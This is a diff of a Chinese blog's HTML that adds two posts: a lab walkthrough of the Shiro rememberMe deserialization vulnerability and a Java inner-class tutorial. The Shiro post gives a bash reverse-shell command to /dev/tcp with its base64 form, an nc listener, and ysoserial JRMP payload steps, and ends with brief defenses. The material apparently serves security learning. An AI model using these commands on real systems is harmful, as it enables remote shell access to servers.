+<p><img src="/2023/09/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fhcm9uX01pbGxlcg==,size_16,color_FFFFFF,t_70.png"></p>
+<h5 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h5><ul>
+<li>受害者IP：192.168.19.208（vulhub, docker)</li>
+<li>攻击者IP：192.168.19.127</li>
+<li><code>dockercompose up -d</code></li>
+</ul>
+<p>出现如下界面说明搭建成功：</p>
+<p><img src="/2023/09/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Blog\source_posts\shiro反序列化漏洞\image-20230910164158104.png"></p>
+<h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a><strong>POC:</strong></h5><p>输入用户名和密码：admin admin，进行抓包</p>
+<p>发现含有<code>rememberMe=deleteMe</code>字段（漏洞特征）</p>
+<p><img src="/2023/09/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Blog\source_posts\shiro反序列化漏洞\image-20230910164755549.png"></p>
+<h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a><strong>EXP:</strong></h5><p><strong>方法一：使用ShiroExploit工具</strong></p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/feihong-cs/ShiroExploit">https://github.com/feihong-cs/ShiroExploit</a></p>
+<ul>
+<li>输入目标地址，选择目标对象，点击下一步</li>
+</ul>
+<p><img src="/2023/09/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Blog\source_posts\shiro反序列化漏洞\image-20230910170503216.png"></p>
+<ul>
+<li>点击下一步</li>
+</ul>
+<p><img src="/2023/09/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Blog\source_posts\shiro反序列化漏洞\image-20230910170531715.png"></p>
+<ul>
+<li>反弹shell</li>
+</ul>
+<p><strong>方法二：ysoserial+shiroexploit</strong></p>
+<ul>
+<li><p>抓取登录的请求包</p>
+</li>
+<li><p>在攻击机开启三个终端：</p>
+<ul>
+<li><p>终端1：nc  -lvvp 81</p>
+<p><img src="/2023/09/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Blog\source_posts\shiro反序列化漏洞\image-20230910172314376.png"></p>
+</li>
+<li><p>终端2：</p>
+<p><img src="/2023/09/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Blog\source_posts\shiro反序列化漏洞\image-20230910172252225.png"></p>
+<ul>
+<li>bash -i &gt;&amp; /dev/tcp/192.168.159.128/81 0&gt;&amp;1 （执行的命令）</li>
+<li>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE1OS4xMjgvODEgMD4mMQ==}|{base64,-d}|{bash,-i} （对执行的命令进行Base64编码）</li>
+<li>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 19999 CommonsCollections6 “ bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE1OS4xMjgvODEgMD4mMQ==}|{base64,-d}|{bash,-i}” （ysoserial在19999端口监听</li>
+</ul>
+</li>
+<li><p>终端3：</p>
+<ul>
+<li><p>生成payload:  java -jar ysoserial.jar JRMPClient “192.168.159.128:19999” &gt; /tmp/jrmp.ser</p>
+<p><img src="/2023/09/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Blog\source_posts\shiro反序列化漏洞\image-20230910172423593.png"></p>
+</li>
+<li><p>对payload进行编码： java -jar shiro-exp.jar encrypt /tmp/jrmp.ser</p>
+<p><img src="/2023/09/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Blog\source_posts\shiro反序列化漏洞\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fhcm9uX01pbGxlcg==,size_16,color_FFFFFF,t_70-16943380689542.png"></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>（这里开始由于shiroexp.jar版本问题，Java报错了，使用原博主的图片，自己主要走一下流程）</p>
+<ul>
+<li><p>将构造的序列化编码cookie通过登录包发送到服务端（这里必须登录成功状态下）</p>
+<p><img src="/2023/09/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Blog\source_posts\shiro反序列化漏洞\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fhcm9uX01pbGxlcg==,size_16,color_FFFFFF,t_70-16943380948244.png"></p>
+</li>
+<li><p>成功收到shell</p>
+<p><img src="/2023/09/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Blog\source_posts\shiro反序列化漏洞\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fhcm9uX01pbGxlcg==,size_16,color_FFFFFF,t_70-16943381050216.png"></p>
+</li>
+</ul>
+<h5 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h5><ul>
+<li>升级Shiro到最新版本</li>
+<li>WAF拦截Cookie中长度过大的rememberMe值</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.zcwww.top/2023/09/09/%E5%86%85%E9%83%A8%E7%B1%BB%E8%AF%A6%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="B3c0me">
+      <meta itemprop="description" content="去爱 去工作">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="THIS IS B3c0me">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/09/09/%E5%86%85%E9%83%A8%E7%B1%BB%E8%AF%A6%E8%A7%A3/" class="post-title-link" itemprop="url">内部类详解</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-09-09 15:39:04" itemprop="dateCreated datePublished" datetime="2023-09-09T15:39:04+08:00">2023-09-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-09-10 14:38:26" itemprop="dateModified" datetime="2023-09-10T14:38:26+08:00">2023-09-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%91%95%E5%BF%83%E6%B2%A5%E8%A1%80%E5%AD%A6JAVA/" itemprop="url" rel="index"><span itemprop="name">呕心沥血学JAVA</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <span id="more"></span>
+
+<h1 id="1-内部类的定义"><a href="#1-内部类的定义" class="headerlink" title="1.内部类的定义"></a>1.内部类的定义</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">内部类就是在一个类的内部定义的类</span><br></pre></td></tr></table></figure>
+
+<h1 id="2-内部类的分类"><a href="#2-内部类的分类" class="headerlink" title="2.内部类的分类"></a>2.内部类的分类</h1><h2 id="2-1成员内部类"><a href="#2-1成员内部类" class="headerlink" title="2.1成员内部类"></a>2.1成员内部类</h2><ul>
+<li>成员内部类格式如下：</li>
+</ul>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">* <span class="keyword">class</span> <span class="keyword">Outer</span> &#123;</span><br><span class="line">*     <span class="keyword">class</span> <span class="keyword">Inner</span>&#123;&#125;</span><br><span class="line">* &#125;</span><br><span class="line">*</span><br><span class="line">* 编译上述代码会产生两个文件：</span><br><span class="line">* <span class="keyword">Outer</span>.<span class="keyword">class</span> 和 <span class="keyword">Outer</span>$<span class="keyword">Inner</span>.<span class="keyword">class</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>示例代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Outer</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">innerPrint</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Inner inner = <span class="keyword">new</span> Inner();</span><br><span class="line">        inner.print();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//私有成员内部类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;inner&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="2-2方法内部类"><a href="#2-2方法内部类" class="headerlink" title="2.2方法内部类"></a>2.2方法内部类</h2><p>内部类可以作为一个类的成员外，还可以把类放在方法内定义</p>
+<p>注意：1.方法内部类只能定义该内部类的方法内实例化，不可以在此方法外对其实例化<br>    2.方法内部类对象不能使用该内部类所在方法的非final局部变量</p>
+<ul>
+<li><p>示例代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">int</span> x = <span class="number">10</span>;</span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">int</span> y = <span class="number">20</span>;</span><br><span class="line">      x*=<span class="number">2</span>;</span><br><span class="line">      <span class="class"><span class="keyword">class</span> <span class="title">Inner2</span></span>&#123;</span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">              System.out.println(<span class="string">&quot;inner2&quot;</span>);</span><br><span class="line">              System.out.println();</span><br><span class="line">              System.out.println(y);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//在方法内部调用内部类的方法</span></span><br><span class="line">      Inner2 inner2 = <span class="keyword">new</span> Inner2();</span><br><span class="line">      inner2.print();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>​    当我们想要在方法内部更改非final的变量值时，提示我们从内部类引用的本地变量必须是最终变量或者实际上的最终变量。</p>
+<ul>
+<li>也就是说，只要内部类访问一个变量，那这个变量必须是该方法的常量</li>
+</ul>
+<p><img src="/2023/09/09/%E5%86%85%E9%83%A8%E7%B1%BB%E8%AF%A6%E8%A7%A3/image-20230909161419434.png"></p>
+</li>
+</ul>
+<h2 id="2-3静态内部类"><a href="#2-3静态内部类" class="headerlink" title="2.3静态内部类"></a>2.3静态内部类</h2><p>在一个类内部定义一个静态的内部类：<br>静态的含义是该内部类可以像其他静态成员一样，没有外部类对象时，也能够方法它。</p>
+<p>静态类嵌套仅能访问外部类的静态成员和方法。</p>
+<ul>
+<li><p>示例代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//静态内部类</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Inner3</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态内部类&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="2-4-匿名内部类"><a href="#2-4-匿名内部类" class="headerlink" title="2.4 匿名内部类"></a>2.4 匿名内部类</h2><blockquote>
+<p>匿名内部类就是没有名字的内部类</p>
+</blockquote>
+<p>内名内部类的三种情况：</p>
+<p>​    （1）继承式的匿名内部类</p>
+<p>​    （2）接口式的匿名内部类</p>
+<p>​    （3）参数式的匿名内部类</p>
+<p><strong>在使用匿名内部类时，有以下几个原则</strong>：</p>
+<ul>
+<li>不能有构造方法，只能有一个实例</li>
+<li>不能定义任何静态成员，静态方法</li>
+<li>不能是public,protected,private,static</li>
+<li>一定是在new的后面，用其隐含实现一个接口或实现一个类</li>
+<li>匿名内部类为局部的，所以局部内部类的所有限制都对其生效</li>
+</ul>
+<h1 id="3-在外部创建内部类对象"><a href="#3-在外部创建内部类对象" class="headerlink" title="3.在外部创建内部类对象"></a>3.在外部创建内部类对象</h1><p>内部类除了可以在外部类中产生实例化对象，也可以在外部类的外部来实例化</p>
+<p>那么，根据内部类生成的*.class文件：Outer$Inner.class</p>
+<p>$符号在程序运行时将被替换成”.”</p>
+<p>所以内部类的访问：通过“外部类·内部类”的形式表示</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Outer</span> <span class="keyword">out</span> = <span class="built_in">new</span> <span class="keyword">Outer</span>(); // 产生外部类实例</span><br><span class="line"><span class="keyword">Outer</span>.<span class="keyword">Inner</span> <span class="keyword">in</span> = <span class="keyword">null</span>; //声明内部类对象</span><br><span class="line"><span class="keyword">in</span> = <span class="keyword">out</span>.<span class="built_in">new</span> <span class="keyword">Inner</span>(); //实例化内部类对象</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="4-问题："><a href="#4-问题：" class="headerlink" title="4.问题："></a><strong>4.问题：</strong></h1><h4 id="局部内部类访问局部变量必须用final修饰，为什么-？"><a href="#局部内部类访问局部变量必须用final修饰，为什么-？" class="headerlink" title="局部内部类访问局部变量必须用final修饰，为什么**？"></a>局部内部类访问局部变量必须用final修饰，为什么**？</h4><p>当调用这个方法时，局部变量如果没有用final修饰，他的生命周期和方法的生命周期是一样的，当方法被调用时会入栈，方法结束后即弹栈，这个局部变量也会消失，如果局部内部类对象还没有马上消失，想继续使用这个局部变量，显然已经无法使用了，如果用final修饰会在类加载的时候进入常量池，即使方法弹栈，常量池的常量还在，也就可以继续使用了。</p>
+<p>注意：在jdk1.8中取消了在局部内部类中使用的变量必须是<strong>显式地使用的final修饰</strong>，也就是说编译器默认会自动为变量加上final</p>
+<h1 id="5-内部类的作用"><a href="#5-内部类的作用" class="headerlink" title="5.内部类的作用"></a>5.内部类的作用</h1><p>每个内部类都能独立地继承自一个（接口的）实现，所以无论外部类是否已经集成了某个（接口的）实现，对于内部类都没有影响。如果没有内部类提供的可以继承多个具体的或抽象的类的能力，一些设计与编程的问题就很难解决。从这个角度看，内部类使得多重继承的解决方案变得完整。接口解决了部分问题，而内部类有效地实现了“多重继承”。</p>
+<p>具体实现：在一个外部类中写多个内部类，不同的内部类继承不同的其他类，这样就可以实现多继承。</p>
+<h1 id="6-内部类小结"><a href="#6-内部类小结" class="headerlink" title="6.内部类小结"></a>6.内部类小结</h1><p><strong>从成员属性来看，内部类可以分为两类：</strong></p>
+<p><strong>成员</strong>：</p>
+<ul>
+<li>成员内部类</li>
+<li>静态内部类</li>
+</ul>
+<p><strong>局部</strong>：</p>
+<ul>
+<li>方法内部类</li>
+<li>匿名内部类</li>
+</ul>
+<p><strong>从依赖外部类对象的角度来看：</strong></p>
+<ul>
+<li><p>成员内部类，方法内部类，匿名内部类都依赖外部类对象</p>
+</li>
+<li><p>静态内部类不依赖外部类的对象</p>
+</li>
+</ul>
+<p><strong>开发中如何选择</strong>：</p>
+<p>我们在项目中<strong>优先考虑使用静态内部类。</strong></p>
+<h1 id="7-附：示例代码"><a href="#7-附：示例代码" class="headerlink" title="7.附：示例代码"></a>7.附：示例代码</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> junior;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span> :</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: zcwww</span></span><br><span class="line"><span class="comment"> * 2023/9/9 15:37</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 内部类就是在一个类的内部定义的类</span></span><br><span class="line"><span class="comment"> *1.成员内部类</span></span><br><span class="line"><span class="comment"> * 成员内部类格式如下：</span></span><br><span class="line"><span class="comment"> * class Outer &#123;</span></span><br><span class="line"><span class="comment"> *     class Inner&#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 编译上述代码会产生两个文件：</span></span><br><span class="line"><span class="comment"> * Outer.class 和 Outer$Inner.class</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InnerClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Outer outer = <span class="keyword">new</span> Outer();</span><br><span class="line">        <span class="comment">//在外部创建成员内部类的实例</span></span><br><span class="line">        <span class="comment">//通常情况下不建议这样实例化内部类的对象</span></span><br><span class="line"><span class="comment">//        Outer.Inner inner = outer.new Inner();</span></span><br><span class="line"><span class="comment">//        inner.print();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//建议使用外部类调用内部类的方法</span></span><br><span class="line">        outer.innerPrint();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用方法内部类</span></span><br><span class="line">        outer.show();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用静态内部类</span></span><br><span class="line">       <span class="keyword">new</span> Outer.Inner3().print();</span><br><span class="line"></span><br><span class="line">       <span class="comment">//继承式内部类匿名类</span></span><br><span class="line">        outer.print1();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//接口式匿名类</span></span><br><span class="line">        outer.print2();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        outer.print3(<span class="keyword">new</span> Eat() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;参数式匿名内部类&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Outer</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">innerPrint</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Inner inner = <span class="keyword">new</span> Inner();</span><br><span class="line">        inner.print();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//私有成员内部类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;inner&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//方法内部类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> y = <span class="number">20</span>;</span><br><span class="line">        x*=<span class="number">2</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Inner2</span></span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;inner2&quot;</span>);</span><br><span class="line">                System.out.println();</span><br><span class="line">                System.out.println(y);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//在方法内部调用内部类的方法</span></span><br><span class="line">        Inner2 inner2 = <span class="keyword">new</span> Inner2();</span><br><span class="line">        inner2.print();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//静态内部类</span></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Inner3</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;静态内部类&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//匿名内部类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//继承式内部类</span></span><br><span class="line">        Cat cat = <span class="keyword">new</span> Cat() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;cat inner继承式匿名内部类&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        cat.eat();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接口式内部类</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Eat eat = <span class="keyword">new</span> Eat() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;接口式匿名类&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        eat.eat();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//参数式内部类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print3</span><span class="params">(Eat eat)</span></span>&#123;</span><br><span class="line">        eat.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Eat</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://www.zcwww.top/2023/09/05/upload-labs/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -386,7 +784,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-09-08 10:18:20" itemprop="dateModified" datetime="2023-09-08T10:18:20+08:00">2023-09-08</time>
+                <time title="修改时间：2023-09-09 14:58:05" itemprop="dateModified" datetime="2023-09-09T14:58:05+08:00">2023-09-09</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -623,7 +1021,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-09-04 11:22:44" itemprop="dateModified" datetime="2023-09-04T11:22:44+08:00">2023-09-04</time>
+                <time title="修改时间：2023-09-09 15:05:57" itemprop="dateModified" datetime="2023-09-09T15:05:57+08:00">2023-09-09</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -669,172 +1067,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
